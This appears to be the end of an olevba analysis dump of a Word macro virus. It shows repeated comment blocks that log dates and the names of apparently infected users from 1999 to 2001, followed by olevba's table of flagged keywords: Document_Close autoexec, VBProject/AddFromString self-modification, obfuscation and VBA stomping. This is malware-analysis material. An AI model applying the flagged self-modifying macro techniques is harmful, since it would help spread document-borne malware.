' 	QuoteRem 0x0000 0x001E " 10:48:08 - ñðåäà, 17 ìàé 2000"
' Line #161:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #162:
' 	QuoteRem 0x0000 0x0000 ""
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #167:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #168:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #169:
' 	QuoteRem 0x0000 0x001E " 10:53:13 - ñðåäà, 17 ìàé 2000"
' Line #170:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #171:
' 	QuoteRem 0x0000 0x0000 ""
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #176:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #177:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #178:
' 	QuoteRem 0x0000 0x001E " 15:46:39 - ñðåäà, 17 ìàé 2000"
' Line #179:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #180:
' 	QuoteRem 0x0000 0x0000 ""
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #185:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #186:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #187:
' 	QuoteRem 0x0000 0x0020 " 15:10:05 - ÷åòâåðã, 18 ìàé 2000"
' Line #188:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #194:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #195:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #196:
' 	QuoteRem 0x0000 0x0024 " 11:08:22 - ïîíåäåëüíèê, 22 ìàé 2000"
' Line #197:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #198:
' 	QuoteRem 0x0000 0x0000 ""
' Line #199:
' Line #200:
' Line #201:
' Line #202:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #203:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #204:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #205:
' 	QuoteRem 0x0000 0x0024 " 14:24:11 - ïîíåäåëüíèê, 22 ìàé 2000"
' Line #206:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #207:
' 	QuoteRem 0x0000 0x0000 ""
' Line #208:
' Line #209:
' Line #210:
' Line #211:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #212:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #213:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #214:
' 	QuoteRem 0x0000 0x0024 " 14:26:03 - ïîíåäåëüíèê, 22 ìàé 2000"
' Line #215:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #216:
' 	QuoteRem 0x0000 0x0000 ""
' Line #217:
' Line #218:
' Line #219:
' Line #220:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #221:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #222:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #223:
' 	QuoteRem 0x0000 0x0020 " 09:34:43 - âòîðíèê, 23 ìàé 2000"
' Line #224:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #225:
' 	QuoteRem 0x0000 0x0000 ""
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #230:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #231:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #232:
' 	QuoteRem 0x0000 0x0020 " 08:45:43 - ÷åòâåðã, 25 ìàé 2000"
' Line #233:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #234:
' 	QuoteRem 0x0000 0x0000 ""
' Line #235:
' Line #236:
' Line #237:
' Line #238:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #239:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #240:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #241:
' 	QuoteRem 0x0000 0x0020 " 10:44:22 - ÷åòâåðã, 25 ìàé 2000"
' Line #242:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #243:
' 	QuoteRem 0x0000 0x0000 ""
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #248:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #249:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #250:
' 	QuoteRem 0x0000 0x0020 " 11:24:54 - ÷åòâåðã, 25 ìàé 2000"
' Line #251:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #252:
' 	QuoteRem 0x0000 0x0000 ""
' Line #253:
' Line #254:
' Line #255:
' Line #256:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #257:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #258:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #259:
' 	QuoteRem 0x0000 0x0024 " 15:19:12 - âîñêðåñåíüå, 28 ìàé 2000"
' Line #260:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #261:
' 	QuoteRem 0x0000 0x0000 ""
' Line #262:
' Line #263:
' Line #264:
' Line #265:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #266:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #267:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #268:
' 	QuoteRem 0x0000 0x0024 " 12:13:51 - ïîíåäåëüíèê, 29 ìàé 2000"
' Line #269:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #270:
' 	QuoteRem 0x0000 0x0000 ""
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #275:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #276:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #277:
' 	QuoteRem 0x0000 0x0024 " 13:54:24 - ïîíåäåëüíèê, 29 ìàé 2000"
' Line #278:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #279:
' 	QuoteRem 0x0000 0x0000 ""
' Line #280:
' Line #281:
' Line #282:
' Line #283:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #284:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #285:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #286:
' 	QuoteRem 0x0000 0x0020 " 10:46:56 - âòîðíèê, 30 ìàé 2000"
' Line #287:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #288:
' 	QuoteRem 0x0000 0x0000 ""
' Line #289:
' Line #290:
' Line #291:
' Line #292:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #293:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #294:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #295:
' 	QuoteRem 0x0000 0x0020 " 11:46:19 - âòîðíèê, 30 ìàé 2000"
' Line #296:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #297:
' 	QuoteRem 0x0000 0x0000 ""
' Line #298:
' Line #299:
' Line #300:
' Line #301:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #302:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #303:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #304:
' 	QuoteRem 0x0000 0x001F " 10:23:20 - ÷åòâåðã, 1 èþí 2000"
' Line #305:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #306:
' 	QuoteRem 0x0000 0x0000 ""
' Line #307:
' Line #308:
' Line #309:
' Line #310:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #311:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #312:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #313:
' 	QuoteRem 0x0000 0x001F " 11:33:29 - ÷åòâåðã, 1 èþí 2000"
' Line #314:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #315:
' 	QuoteRem 0x0000 0x0000 ""
' Line #316:
' Line #317:
' Line #318:
' Line #319:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #320:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #321:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #322:
' 	QuoteRem 0x0000 0x001F " 00:50:38 - âòîðíèê, 6 èþí 2000"
' Line #323:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #324:
' 	QuoteRem 0x0000 0x0000 ""
' Line #325:
' Line #326:
' Line #327:
' Line #328:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #329:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #330:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #331:
' 	QuoteRem 0x0000 0x001F " 01:07:44 - âòîðíèê, 6 èþí 2000"
' Line #332:
' 	QuoteRem 0x0000 0x0018 " Ìàóëü Ñåðãåé Âàñèëüåâè÷"
' Line #333:
' 	QuoteRem 0x0000 0x0000 ""
' Line #334:
' Line #335:
' Line #336:
' Line #337:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #338:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #339:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #340:
' 	QuoteRem 0x0000 0x0020 " 13:37:58 - ñóááîòà, 17 èþí 2000"
' Line #341:
' 	QuoteRem 0x0000 0x0005 " Mike"
' Line #342:
' 	QuoteRem 0x0000 0x0006 " Jhuma"
' Line #343:
' 	QuoteRem 0x0000 0x000B " Shibrampur"
' Line #344:
' 	QuoteRem 0x0000 0x000A " Burichang"
' Line #345:
' 	QuoteRem 0x0000 0x0008 " Comilla"
' Line #346:
' Line #347:
' Line #348:
' Line #349:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #350:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #351:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #352:
' 	QuoteRem 0x0000 0x0020 " 13:38:10 - ñóááîòà, 17 èþí 2000"
' Line #353:
' 	QuoteRem 0x0000 0x0005 " Mike"
' Line #354:
' 	QuoteRem 0x0000 0x0006 " Jhuma"
' Line #355:
' 	QuoteRem 0x0000 0x000B " Shibrampur"
' Line #356:
' 	QuoteRem 0x0000 0x000A " Burichang"
' Line #357:
' 	QuoteRem 0x0000 0x0008 " Comilla"
' Line #358:
' Line #359:
' Line #360:
' Line #361:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #362:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #363:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #364:
' 	QuoteRem 0x0000 0x001F " 16:05:05 - Tuesday, 8 Aug 2000"
' Line #365:
' 	QuoteRem 0x0000 0x0017 " Righard J. Zwienenberg"
' Line #366:
' 	QuoteRem 0x0000 0x0000 ""
' Line #367:
' Line #368:
' Line #369:
' Line #370:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #371:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #372:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #373:
' 	QuoteRem 0x0000 0x001F " 18:29:06 - Tuesday, 8 Aug 2000"
' Line #374:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #375:
' 	QuoteRem 0x0000 0x0000 ""
' Line #376:
' Line #377:
' Line #378:
' Line #379:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #380:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #381:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #382:
' 	QuoteRem 0x0000 0x001F " 18:29:19 - Tuesday, 8 Aug 2000"
' Line #383:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #384:
' 	QuoteRem 0x0000 0x0000 ""
' Line #385:
' Line #386:
' Line #387:
' Line #388:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #389:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #390:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #391:
' 	QuoteRem 0x0000 0x001F " 18:29:26 - Tuesday, 8 Aug 2000"
' Line #392:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #393:
' 	QuoteRem 0x0000 0x0000 ""
' Line #394:
' Line #395:
' Line #396:
' Line #397:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #398:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #399:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #400:
' 	QuoteRem 0x0000 0x001F " 18:29:32 - Tuesday, 8 Aug 2000"
' Line #401:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #402:
' 	QuoteRem 0x0000 0x0000 ""
' Line #403:
' Line #404:
' Line #405:
' Line #406:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #407:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #408:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #409:
' 	QuoteRem 0x0000 0x001F " 18:29:39 - Tuesday, 8 Aug 2000"
' Line #410:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #411:
' 	QuoteRem 0x0000 0x0000 ""
' Line #412:
' Line #413:
' Line #414:
' Line #415:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #416:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #417:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #418:
' 	QuoteRem 0x0000 0x001F " 18:29:46 - Tuesday, 8 Aug 2000"
' Line #419:
' 	QuoteRem 0x0000 0x0013 " Replication System"
' Line #420:
' 	QuoteRem 0x0000 0x0000 ""
' Line #421:
' Line #422:
' Line #423:
' Line #424:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #425:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #426:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #427:
' 	QuoteRem 0x0000 0x0020 " 11:07:03 - Freitag, 12 Okt 2001"
' Line #428:
' 	QuoteRem 0x0000 0x000D " Andreas Marx"
' Line #429:
' 	QuoteRem 0x0000 0x0000 ""
' Line #430:
' Line #431:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

